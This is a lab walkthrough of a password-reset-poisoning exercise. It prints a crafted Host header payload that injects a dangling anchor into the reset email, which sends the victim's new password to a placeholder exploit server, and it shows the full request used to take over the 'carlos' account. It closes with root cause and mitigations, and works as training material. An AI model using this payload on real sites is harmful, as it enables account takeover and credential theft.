Lab: Password reset poisoning via dangling markup

Difficulty: Expert
Vulnerability: Password reset poisoning via dangling markup (HTML injection through unsanitized raw email + Host header tampering)

Summary

This lab abuses how the app builds password-reset emails and how the email client lets you view raw HTML. The app writes the email HTML into a string that usually gets sanitized with DOMPurify — but the raw view doesn’t get sanitized. By tampering with the Host header (adding a funky port), you can break out of a quoted string in the raw email and inject a dangling <a> tag that points to your exploit server. The server then logs the rest of the email body (which includes the new password) as a GET request to your exploit server. Do that for carlos and you get his new password → log in as Carlos. Nice and nasty.

Steps taken

Logged in as the lab user (provided creds):
wiener : peter

From the app's login page I requested a password reset for my own account (wiener).

Opened the exploit server email client and read the password reset email.

Rendered view: the email looked normal — the reset link pointed at the generic login page and there was no token in the URL. Instead the new password was just shown in the email body.

Nothing weird at first glance.

Switched the email client to view raw HTML.

Here the email looked unsanitized — raw HTML with quoted strings, etc. This raw view is the key: it contained the string where the domain/port gets injected and then later the plaintext password appears.

In Burp, sent the POST /forgot-password request to Repeater (the request that triggers the password reset email).

Observed that changing the Host header domain caused errors, but adding a non-numeric port to the Host header still worked (the app accepted it).

Example:

Host: YOUR-LAB-ID.web-security-academy.net:1337


Sending that still triggered a password reset email.

Checked the raw HTML of the email and noticed the port string was reflected inside a single-quoted link/string in the template — meaning I could try to break out of that quoting.

Crafted a Host header that breaks out of the quoted string and injects a dangling anchor that points to my exploit server. In Burp Repeater I used a Host header like this (replace placeholders):

Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?


The trailing ? and the rest of the email body get swallowed into the href when the raw email HTML is assembled.

Sent the POST /forgot-password request again (for my user). Then checked the exploit server access logs.

I saw an entry like:

GET /?/login'>... (rest of email body, including the new password)


The server made a request to my exploit server containing the rest of the email body — and crucially, the password.

Final pivot: resent the same POST /forgot-password request but changed the username parameter to carlos.

Checked the exploit server access log again and found Carlos’s new password in the request entry.

Logged into the app as carlos with the retrieved password — lab solved.

Key request/headers & payloads (what I actually used)

Request to trigger reset (example body):

POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded
username=carlos


Replace YOUR-LAB-ID and YOUR-EXPLOIT-SERVER-ID with the lab & exploit-server IDs shown in your instance.

The important trick: use a non-numeric port / string in Host to appear inside the email template and then append the breaking '<a href="//... sequence to open an anchor tag that steals the remainder of the email into the URL.

Root cause

The app builds password reset emails using user-controllable data (reflected Host header) and initially sanitizes it for the rendered view using DOMPurify — but the raw HTML view is not sanitized.

The email template places the reflected host/port inside a quoted string; by injecting characters that break that string (via a crafted Host) you can cause dangling markup that turns the rest of the email into a URL to your server. The server then accidentally leaks the new password via a request to your exploit server (because the victim client loads/clicks that dangling link or the email client shows raw HTML containing it and the exploit server receives the request).

In short: unsafe reflection of Host + unsanitized raw email display = account takeover.

Fixes / Mitigations

Never reflect user-controllable headers directly into email HTML templates. Treat Host as untrusted input.

Ensure every view of email content (rendered and raw) is sanitized or, better, never include untrusted content in the email HTML at all. Strip or escape characters that can break quoting or start tags.

Don’t send plaintext passwords in emails. Use a one-time token-based flow: generate a secure token server-side, include a tokenized reset link (with proper CSRF-like protections), and require the user to set a new password through a controlled form.

On the exploit-server side (email client), disallow or sanitize a “view raw HTML” that bypasses server-side sanitization. If raw must be available, show it only in a safe viewer that treats it as text (no active HTML).

Validate and canonicalize Host header input; reject non-standard ports or unexpected characters when the app uses Host for any HTML generation.
